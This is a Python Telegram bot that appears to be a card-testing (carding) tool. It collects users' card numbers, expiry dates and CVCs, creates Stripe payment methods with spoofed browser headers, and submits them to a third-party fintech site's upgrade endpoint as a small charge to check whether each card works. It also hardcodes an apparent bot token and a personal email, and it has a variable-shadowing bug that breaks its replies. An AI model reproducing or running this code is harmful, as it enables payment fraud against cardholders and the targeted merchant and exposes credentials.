import telebot
import requests

API_TOKEN = '8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "Send your credit card details in one message:\n"
        "CARDNUMBER,MM,YY,CVC\n"
        "Example: 4147098797621083,10,28,202"
    )

@bot.message_handler(func=lambda message: True)
def handle_card_input(message):
    try:
        text = message.text.strip()
        parts = [p.strip() for p in text.split(',')]
        if len(parts) != 4:
            bot.send_message(message.chat.id, "Invalid format. Please send as: CARDNUMBER,MM,YY,CVC")
            return
        card_number, exp_month, exp_year, cvc = parts
        email = "peshangsalam2001@gmail.com"

        # Create Stripe payment method
        stripe_response = create_stripe_payment_method(card_number, cvc, exp_month, exp_year, email)
        print("Stripe response:", stripe_response)

        if 'error' in stripe_response:
            # Declined or error
            message_text = stripe_response['error'].get('message', 'Card declined or error.')
            bot.send_message(message.chat.id, f"Your card was declined.\nReason: {message_text}")
            return

        # Check if payment method created successfully
        if 'id' in stripe_response:
            payment_method_id = stripe_response['id']
        else:
            bot.send_message(message.chat.id, "Failed to create payment method.")
            return

        # Send to your website URL
        website_resp_text = send_to_your_website(payment_method_id)
        print("Website response:", website_resp_text)

        # Parse website response
        # It's JSON, so parse it
        import json
        resp_json = json.loads(website_resp_text)

        # Check for decline
        if 'toast' in resp_json:
            toast = resp_json['toast']
            status = toast.get('status')
            message = toast.get('message', '')
            if status == 'error':
                bot.send_message(message.chat.id, f"Payment Declined: {message}")
            elif status == 'success':
                bot.send_message(message.chat.id, "✅ Payment succeeded! Your card was accepted.")
            else:
                bot.send_message(message.chat.id, f"Website response: {website_resp_text}")
        else:
            # fallback if toast not present
            bot.send_message(message.chat.id, f"Unexpected response: {website_resp_text}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")
        print("Error:", e)

def create_stripe_payment_method(card_number, cvc, exp_month, exp_year, email):
    url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "Host": "api.stripe.com",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": "same-site",
        "origin": "https://js.stripe.com",
        "sec-fetch-mode": "cors",
        "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2  Mobile/15E148 Safari/605.1.15'
    }
    data = {
        "type": "card",
        "billing_details[email]": email,
        "billing_details[address][postal_code]": "10080",
        "card[number]": card_number,
        "card[cvc]": cvc,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "guid": "test-guid",
        "muid": "test-muid",
        "sid": "test-sid",
        "pasted_fields": "number",
        "payment_user_agent": "stripe.js/cc3c01f5f2; stripe-js-v3/cc3c01f5f2; card-element",
        "referrer": "https://www.example.com/",
        "time_on_page": "12345",
        "key": "YOUR_PUBLIC_KEY",
        "_stripe_account": "YOUR_STRIPE_ACCOUNT_ID"
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def send_to_your_website(payment_method_id):
    url = "https://www.popularfintech.com/upgrade?_data=routes%2Fupgrade"
    headers = {
        "Host": "www.popularfintech.com",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "sec-fetch-mode": "cors",
        "referer": "https://www.popularfintech.com/",
        "sentry-trace": "sample-trace-id",
        # add cookies if needed
    }
    data = {
        "email": "peshangsalam2001@gmail.com",
        "force_three_d_secure": "false",
        "price_id": "your_price_id",
        "payment_method": payment_method_id,
        "amount_cents": "100",
        "upgrade_error_message": "Oops%2C+something+went+wrong.",
        "upgrade_success_message": "You+are+now+a+premium+subscriber"
    }
    response = requests.post(url, headers=headers, data=data)
    return response.text

# Run the bot
bot.polling()